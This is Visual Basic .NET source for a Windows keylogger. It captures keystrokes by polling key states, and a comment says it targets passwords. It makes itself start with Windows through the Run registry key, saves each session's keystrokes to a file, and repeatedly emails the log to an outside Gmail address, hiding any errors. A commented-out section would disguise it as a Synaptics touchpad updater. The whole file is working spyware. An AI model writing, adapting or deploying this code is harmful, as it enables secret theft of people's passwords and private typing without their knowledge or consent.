Imports System.Runtime.InteropServices
Imports System.Net.Mail
Public Class Form1
    Private Const max_vm_chars As Integer = 254
    Dim currentOutput As String
    Dim lastKeyArr() As Keys
    Dim sessionCode As Integer

    <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=True)>
    Public Shared Function GetAsyncKeyState(ByVal vkey As Integer) As Short

    End Function
    Public Declare Function ToAsciiEx Lib "user32" (ByVal uVirtKey As UInteger, ByVal uScanCode As UInteger, ByVal lpKeyState As Byte(), <Out()> ByVal lpChar As System.Text.StringBuilder, ByVal uFlags As UInteger, ByVal hkl As IntPtr) As Integer
    <DllImport("user32.dll")> _
    Private Shared Function GetKeyboardState(ByVal keyState() As Byte) As Boolean
    End Function
    <DllImport("user32.dll")> _
    Private Shared Function MapVirtualKeyEx(ucode As UInteger, uMapType As MapVirtualKeyMapTypes, dwhkl As UInteger) As UInteger

    End Function
    Private Function ConvertToString(vk As Keys) As String
        Dim conv As KeysConverter
        conv = New KeysConverter()
        Return conv.ConvertToString(vk)
    End Function
    Public Declare Function GetKeyboardLayout Lib "user32" (ByVal idThread As UInteger) As IntPtr
    Private Sub GoTimer_Tick(sender As Object, e As EventArgs) Handles GoTimer.Tick
        Dim byteArr() As Byte
        byteArr = {}
        ReDim Preserve byteArr(255)
        Dim result As Boolean = GetKeyboardState(byteArr)
        'If GetAsyncKeyState(Keys.A) Then
        'generalized example
        '    output.Text += doModifiers(ConvertToString(Keys.A))
        'End If
        Dim KeyDelay = SystemInformation.KeyboardDelay
        Dim keyArr() As Integer = [Enum].GetValues(GetType(Keys))
        Dim i As Integer
        For i = 0 To keyArr.Length - 1 Step 1
            Dim value As Integer = GetAsyncKeyState(keyArr(i))

            If value Then
                If doExclusions(keyArr(i)) Then
                    'see msdn page for keydelay formula
                    If lastKeyArr(i) = 0 Then
                        'prevent repeats entirely; passwords are unlikely to involve repeats

                        'special cases abound.
                        Select Case keyArr(i)
                            Case Keys.Space
                                output.Text += " "
                            Case Keys.Delete
                                If output.Text <> "" Then
                                    output.Text = output.Text.Substring(0, output.Text.Length - 1)
                                End If
                            Case Keys.Back
                                If output.Text <> "" Then
                                    output.Text = output.Text.Substring(0, output.Text.Length - 1)
                                End If
                            Case Keys.Enter
                                output.Text += Environment.NewLine
                            Case Keys.OemPeriod
                                output.Text += doModifiers(".")
                            Case Keys.Oemcomma
                                output.Text += doModifiers(",")
                            Case Keys.Oem1
                                output.Text += doModifiers(";")
                            Case Keys.Oem7
                                output.Text += doModifiers("'")

                            Case Else
                                output.Text += doModifiers(ConvertToString(keyArr(i)))
                        End Select

                    End If

                End If
            End If
            lastKeyArr(i) = value

        Next
        
    End Sub

    Private Function doExclusions(input As Keys) As Boolean
        'essentially a constant array defined in the method- clumsy but effective I guess
        Dim excluded() As Keys = {Keys.Oem5, Keys.LButton, Keys.RButton, Keys.Scroll, Keys.PrintScreen, Keys.Left, Keys.Right, Keys.Up, Keys.Down, Keys.Attn, Keys.Apps, Keys.Alt, Keys.BrowserBack, Keys.BrowserForward, Keys.BrowserHome, Keys.BrowserRefresh, Keys.BrowserStop, Keys.BrowserHome, Keys.LShiftKey, Keys.RShiftKey, Keys.ShiftKey, Keys.Shift, Keys.CapsLock, Keys.Tab, Keys.LControlKey, Keys.RControlKey, Keys.ControlKey, Keys.LWin, Keys.RWin, Keys.Menu}
        Dim i As Integer
        For i = 0 To excluded.Length - 1 Step 1
            If input = excluded(i) Then
                Return False
            End If
        Next
        Return True
    End Function
    Private Function doModifiers(input As String) As String
        Dim ShiftState As Integer = GetAsyncKeyState(Keys.LShiftKey) + GetAsyncKeyState(Keys.RShiftKey)
        Dim clockState As Integer = GetAsyncKeyState(Keys.CapsLock)
        Dim modified As String = input
        If IsNumeric(input) Then
            'symbols!
            If Not ShiftState = 0 Then
                'Shift is not pressed, but is capslock?
                If clockState = 0 Then
                    modified = NumberToSymbol(input)
                Else
                    'Shift and clock are not pressed. Make it lower.
                    modified = input.ToLower
                End If

            Else
                If clockState = 0 Then
                    modified = input.ToLower
                    'Shift AND capslock are pressed. Actually a lower case.
                Else
                    'In most cases, having clock on will not cause symbols.
                    modified = input.ToLower
                End If
            End If
        Else
            If Not ShiftState = 0 Then
                'Shift is not pressed, but is capslock?
                If clockState = 0 Then
                    modified = input.ToUpper
                    modified = upperSymbol(input)
                Else
                    'Shift and clock are not pressed. Make it lower.
                    modified = input.ToLower
                End If

            Else
                If clockState = 0 Then
                    modified = input.ToLower
                    'Shift AND capslock are pressed. Actually a lower case.
                Else
                    modified = input.ToUpper
                    modified = upperSymbol(input)
                End If
            End If

        End If
        Return modified
    End Function
    Private Function NumberToSymbol(input As String) As String
        Dim symbols() As String = {")", "!", "@", "#", "$", "%", "^", "&", "*", "("}
        Return symbols(input)
    End Function
    Private Function upperSymbol(input As String) As String
        Select Case input
            Case ";"
                Return ":"
            Case "'"
                Return """"
            Case "/"
                Return "?"
            Case ","
                Return "<"
            Case "."
                Return ">"
            Case "["
                Return "{"
            Case "]"
                Return "}"
            Case "-"
                Return "_"
            Case "="
                Return "+"
            Case "\"
                Return "|"

        End Select
        Return input
    End Function
    Private Function ScanToAscII(scancode As Integer) As String
        Dim layout As IntPtr = GetKeyboardLayout(0)
        Dim state() As Byte
        ReDim Preserve state(255)
        If Not GetKeyboardState(state) Then
            Return ""
        End If
        Dim vk As UInteger = MapVirtualKeyEx(scancode, MapVirtualKeyMapTypes.MAPVK_VSC_TO_VK, layout)
        Return ToAsciiEx(vk, scancode, state, New System.Text.StringBuilder, 0, layout)

    End Function
    Private Enum MapVirtualKeyMapTypes As Integer
        MAPVK_VK_TO_VSC = &H0
        MAPVK_VSC_TO_VK = &H1
        MAPVK_VK_TO_CHAR = &H2
        MAPVK_VSC_TO_VK_EX = &H3
        MAPVK_VK_TO_VSC_EX = &H4

    End Enum

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        SendDataFile()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ReDim Preserve lastKeyArr(255)
        Dim repeatSpeed = SystemInformation.KeyboardSpeed
        Dim repsPerSecond As Double = 2.5 + (30 / 31) * repeatSpeed
        'we now have the number of times per second it triggers. 1000 ms/s
        Dim repsPerMillisecond = repsPerSecond
        GoTimer.Interval = repsPerMillisecond
        'we now have the number of times per millisecond it triggers.
        Dim rnd As Random = New System.Random
        sessionCode = rnd.Next(0, 86400)
        'Ensure each instance saves its own data file.
        'Dim di As System.IO.DirectoryInfo = New IO.DirectoryInfo(My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "/hasStartup")
        Try
            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        Catch ex As Exception

        End Try

        'Dim t As Type = Type.GetTypeFromCLSID(New Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"))
        'Dim shell As Object = Activator.CreateInstance(t)
        'Try
        '    Dim lnk As Object = t.InvokeMember("CreateShortcut", Reflection.BindingFlags.InvokeMethod, Nothing, shell, New Object() {"SynapticsTouchDevice"})
        '    Try
        '        t.InvokeMember("TargetPath", Reflection.BindingFlags.SetProperty, Nothing, lnk, New Object() {My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "/SynapticsTouchDeviceUpdater.exe"})
        '        t.InvokeMember("IconLocation", Reflection.BindingFlags.SetProperty, Nothing, lnk, New Object() {"shell32.dll, 5"})
        '        t.InvokeMember("Save", Reflection.BindingFlags.InvokeMethod, Nothing, lnk, Nothing)
        '    Catch ex As Exception

        '    Finally
        '        Marshal.FinalReleaseComObject(lnk)
        '    End Try


        'Catch ex As Exception

        'Finally
        '    Marshal.FinalReleaseComObject(shell)
        'End Try

    End Sub

    Private Sub SendDataFile()
        Dim client As SmtpClient

        client = (New SmtpClient("smtp.gmail.com", 587))

        client.UseDefaultCredentials = False
        client.Credentials = New System.Net.NetworkCredential("user@evilsite.com", "pass")
        client.EnableSsl = True
        client.Timeout = 30000
        Try
            Dim text As String = My.Computer.FileSystem.ReadAllText(My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "/data + (" + sessionCode.ToString + ")" + ".txt")
            client.Send(New MailMessage("no_reply@noreply.net", "blackhatwearsawhitehat@gmail.com", "Data report for session " + sessionCode.ToString, text))
            'Suppress all exceptions.
        Catch ex As Exception

        End Try
        
    End Sub
    Private Sub dataFile_Tick(sender As Object, e As EventArgs) Handles dataFile.Tick
        Dim fileLocation As String = My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "/data + (" + sessionCode.ToString + ")" + ".txt"
        'write all data to a file in directory
        My.Computer.FileSystem.WriteAllText(fileLocation, output.Text, False)
        SendDataFile()
    End Sub
End Class
